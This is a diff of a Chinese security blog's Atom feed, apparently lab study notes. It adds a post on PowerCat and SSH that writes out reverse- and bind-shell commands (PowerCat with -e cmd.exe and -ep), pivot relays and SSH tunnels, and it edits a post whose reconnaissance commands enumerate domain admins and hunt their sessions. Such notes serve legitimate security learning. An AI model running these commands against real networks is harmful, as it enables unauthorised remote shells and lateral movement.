@@ -6,7 +6,7 @@
   <link href="https://bigbug888.github.io/atom.xml" rel="self"/>
   
   <link href="https://bigbug888.github.io/"/>
-  <updated>2021-11-29T20:18:47.386Z</updated>
+  <updated>2021-12-01T02:13:33.291Z</updated>
   <id>https://bigbug888.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PowerCat&amp;&amp;SSH使用</title>
+    <link href="https://bigbug888.github.io/posts/19.html"/>
+    <id>https://bigbug888.github.io/posts/19.html</id>
+    <published>2021-11-30T14:11:12.000Z</published>
+    <updated>2021-12-01T02:13:33.291Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h1><p>PowerCat:windows下面的vc，是一个ps1脚本，windows下面的工具</p><p>PowerCat与netcat命令功能相似，可以相互连接，其中PowerCat可以返回powershell，而netcat不支持</p><h3 id="导入PowerCat"><a href="#导入PowerCat" class="headerlink" title="导入PowerCat"></a>导入PowerCat</h3><pre class="line-numbers language-none"><code class="language-none">powershell  #进入powershell命令行Set-ExecutionPolicy RemoteSigned #设置允许执行本地powershell脚本Import-Module ./PowerCat.ps1PowerCat -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>nc正向连接PowerCat</p><pre class="line-numbers language-none"><code class="language-none">在win7上执行命令，开始监听：PowerCat -l -p 4444 -e c:\windows\system32\cmd.exe -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301953049.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301952138.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301954885.png"></p><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令，连接win7端口获得cmd命令行：nc 192.168.114.7 4444 -vvipconfig验证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301955720.png"></p><h3 id="反向连接PowerCat"><a href="#反向连接PowerCat" class="headerlink" title="反向连接PowerCat"></a>反向连接PowerCat</h3><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令监听：nc -l -p 4444 -vv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302007490.png"></p><pre class="line-numbers language-none"><code class="language-none">在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -e cmd.exe其中端口是边界kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302006882.png"></p><h3 id="通过PowerCat反弹powershell"><a href="#通过PowerCat反弹powershell" class="headerlink" title="通过PowerCat反弹powershell"></a>通过PowerCat反弹powershell</h3><pre class="line-numbers language-none"><code class="language-none">在边界kali上执行命令监听：nc -l -p 4444 -vv开始监听在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302012336.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302012420.png"></p><h3 id="win12和win7通过powercat连接"><a href="#win12和win7通过powercat连接" class="headerlink" title="win12和win7通过powercat连接"></a>win12和win7通过powercat连接</h3><pre class="line-numbers language-none"><code class="language-none">win7反弹win12，win12监听端口，win7让他主动去连接win7：powercat -l -v -p 899win12:powercat -c 192.168.114.12 -p 889 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302029154.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302030056.png"></p><p>反过来</p><p>win7中</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302033475.png"></p><p>win2016</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302033801.png"></p><p>以上是powercat获取shell方式</p><h3 id="通过PowerCat与nc传输文件"><a href="#通过PowerCat与nc传输文件" class="headerlink" title="通过PowerCat与nc传输文件"></a>通过PowerCat与nc传输文件</h3><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令监听：nc -l -p 5566 &gt; test.txt开始监听，并把传输的内容写入到test.txt中在win7中执行命令：PowerCat -c 192.168.83.100 -p 4444 -i C:\PowerCat-master\README.md -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302040642.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302041717.png"></p><h3 id="两个内网机子进行文件传输"><a href="#两个内网机子进行文件传输" class="headerlink" title="两个内网机子进行文件传输"></a>两个内网机子进行文件传输</h3><pre class="line-numbers language-none"><code class="language-none">win7：powercat -l -v -p 3333 -of c:\1.txtwin16powercat  -c 192.168.114.7 -p 3333 -i c:\2.txt -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302052836.png" alt="win2016"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302052845.png" alt="win7"></p><h3 id="使用PowerCat作为跳板"><a href="#使用PowerCat作为跳板" class="headerlink" title="使用PowerCat作为跳板"></a>使用PowerCat作为跳板</h3><pre class="line-numbers language-none"><code class="language-none">靶机监听：PowerCat -l -v -p 6666 -e cmd.exe跳板机监听：PowerCat -l -v -p 4444 -r tcp:192.168.83.91:6666这样，当访问跳板机的4444端口时，就会把流量转发给靶机（192.168.83.91）的6666端口中了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302053269.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302059818.png"></p><pre class="line-numbers language-none"><code class="language-none">以win16为跳板，通过16获得win7的shell边界kali连接跳板机win16win7： powercat -l -v -p 6767 -e c:\windows\system32\cmd.exewin16:powercat -l -v -p 8888 -r tcp:192.168.114.7:6767边界kali： nc 192.168.114.12 8888 -vv若失败的话，则win7和win16反过来试试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105285.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105855.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105733.png"></p><pre class="line-numbers language-none"><code class="language-none">ping边界kali，通了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302107231.png"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110292.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110736.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110188.png"></p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302111495.png"></p><pre class="line-numbers language-none"><code class="language-none">先修改两个kali中的ssh配置文件：vim /etc/ssh/sshd_config保证这五个是yes改完记得重启服务：service ssh restart        或者/etc/init/ssh restart(这个好像没啥用)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302133231.png"></p><pre class="line-numbers language-none"><code class="language-none">vps kali中    ssh –CfNg –L 2222:192.168.114.7:3389 root@192.168.43.21win7的3389转发到2222<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302233806.png"></p><pre class="line-numbers language-none"><code class="language-none">ssh –CfNg –L 2222（vps）:192.168.63.8:3389 root@192.168.3.19物理机访问：192.168.43.19:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>建立sock4/5代理通道</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302252738.png"></p><pre class="line-numbers language-none"><code class="language-none">vps kali中：  ssh –CfNg –D 5000 root@192.168.43.21再输入密码确认代理是否开启可以查看端口库：netstat -ant再开win7中的phpstudy物理机浏览器输入，首先手动配置代理192.168.43.21 5000浏览器访问192.168.114.7vps中： vim /etc/proxychains.conf写入socks5：192.168.43.21 5000保存如果要访问它：proxychains curl 192.168.150.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302248182.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;powercat&quot;&gt;&lt;a href=&quot;#powercat&quot; class=&quot;headerlink&quot; title=&quot;powercat&quot;&gt;&lt;/a&gt;powercat&lt;/h1&gt;&lt;p&gt;PowerCat:windows下面的vc，是一个ps1脚本，windows下面的工具&lt;/p</summary>
+      
+    
+    
+    
+    <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
+    
+    
+    <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>NECAT使用</title>
@@ -36,9 +62,9 @@
     <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
     
     
-    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
-    
     <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -62,18 +88,18 @@
     <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
     
     
-    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
-    
     <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
   <entry>
-    <title>内网信息收集</title>
+    <title>域内信息收集</title>
     <link href="https://bigbug888.github.io/posts/16.html"/>
     <id>https://bigbug888.github.io/posts/16.html</id>
-    <published>2021-11-22T13:00:00.000Z</published>
-    <updated>2021-11-29T20:18:28.837Z</updated>
+    <published>2021-11-22T13:00:01.000Z</published>
+    <updated>2021-12-01T02:14:41.117Z</updated>
     
     <content type="html"><![CDATA[<h1 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h1><h2 id="域内基础信息"><a href="#域内基础信息" class="headerlink" title="域内基础信息"></a>域内基础信息</h2><pre class="line-numbers language-none"><code class="language-none">Net view /domain 查看域Net view /domain:xxx 查看xxx域内所有主机Net group /domain 查看用户组列表Net group “Domain Admins” /domain 查询域管理员列表Net accounts /domain 查看域用户密码策略Nltest /domain_trusts 查看域信任信息遇到6118错误，可能是防火墙没有关闭或者server，workstation，computer browser未开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260537506.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260537680.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260541071.png"></p><h2 id="域控制器的查找"><a href="#域控制器的查找" class="headerlink" title="域控制器的查找"></a>域控制器的查找</h2><pre class="line-numbers language-none"><code class="language-none">Nltest /DCLIST:XXX 查看域控制器的名称Nslookup –type=SRV _ldap._tcpNet time /domain 查看域时间Net group “domain controllers” /domain 查看所有域控制器Netdom query pdc 查找域控制器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260600969.png"></p><h2 id="域内用户和管理员的获取"><a href="#域内用户和管理员的获取" class="headerlink" title="域内用户和管理员的获取"></a>域内用户和管理员的获取</h2><pre class="line-numbers language-none"><code class="language-none">查询所有域用户列表Net user /domain 查看域用户列表Wmic useraccount get /all 获取域内用户详细信息Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息Net localgroup administrators /domain 查看administrators组内所有用户查询域管理员用户组Net group “domain admins” /domainNet group “Enterprise Admins” /domain注意：这些域命令需要域权限（域用户）和system权限才能执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260606672.png"></p><h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><p>wevtuil导出日志</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260608202.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260613019.png"></p><p>会话</p><pre class="line-numbers language-none"><code class="language-none">1，定位域管理员工具Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户（注意：需要安装.net框架才可以）Netsess.exe 查主机会话的工具Nmap 的NSE脚本Powerview 脚本-Invoke-UserHunterPowershell.exe –exec bypass –Command “&amp; {Import-Module C:\PowerView.ps1; Invoke-UserHunter}”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260617955.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111260618412.png"></p><p>查看域管理进程</p><ol><li>本机检查</li></ol><pre class="line-numbers language-none"><code class="language-none">获取域管理员列表net group “domain admins” /domain⚫ 查看本机所有进程Tasklist /v⚫ 交叉(当前域有多少个管理员，本机所有进程有那些是域管理员运行的)域管理员进程,然后模拟域管理进程从而获取域管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>查询域管理进程</li></ol><pre class="line-numbers language-none"><code class="language-none">1，收集域控制器的列表net group “domain controllers” /domain2，收集域管理员的列表net group “domain admins” /domain3，使用netsess.exe查询每个域控制器，收集所有活动域会话的列表。netsess.exe –h（查询主机会话）4，将域管理员列表与活动会话列表交叉引用，以确定哪些ip地址具有活动域令牌           FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261120526.png"><br>3. 扫描远程系统上的运行任务</p><pre class="line-numbers language-none"><code class="language-none">收集域管理员的列表net group “domain admins” /domain &gt; admins.txtnet group “domain controllers” /domain &gt; dcs.txtFOR /F %i in (dcs.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261123025.png"></p><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>优点：不会占用内存，不用写入到磁盘中去，需要用到.net框架</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261134502.png"></p><pre class="line-numbers language-none"><code class="language-none">Powershell –exec bypass “import-module ./powerview.ps1;get-netdomain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261141480.png" alt="image-20211126114141406"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261142516.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261144486.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111261146322.png"></p><pre class="line-numbers language-none"><code class="language-none">上面情况估计是中文路径的锅<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
     
@@ -88,9 +114,9 @@
     <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
     
     
-    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
-    
     <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -114,9 +140,9 @@
     <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
     
     
-    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
-    
     <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -140,9 +166,9 @@
     <category term="网安" scheme="https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"/>
     
     
-    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
-    
     <category term="渗透" scheme="https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="内网" scheme="https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
